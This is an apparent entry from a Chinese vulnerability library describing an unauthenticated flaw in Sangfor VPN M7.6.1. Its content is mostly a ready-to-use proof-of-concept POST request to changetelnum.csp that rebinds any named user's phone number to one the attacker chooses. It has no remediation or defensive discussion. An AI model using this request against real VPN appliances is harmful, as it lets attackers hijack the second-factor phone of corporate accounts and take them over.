---
title: '深信服VPN任意修改绑定手机'
date: Thu, 17 Sep 2020 04:47:25 +0000
draft: false
tags: ['白阁-漏洞库']
---

### 影响范围

M7.6.1

### 漏洞POC

```html
https://127.0.0.1/por/changetelnum.csp?apiversion=1 
POST：
newtel=TARGET_PHONE&sessReq=clusterd&username=TARGET_USERNAME&grpid=0&sessid=0&ip=127.0.0.1 

```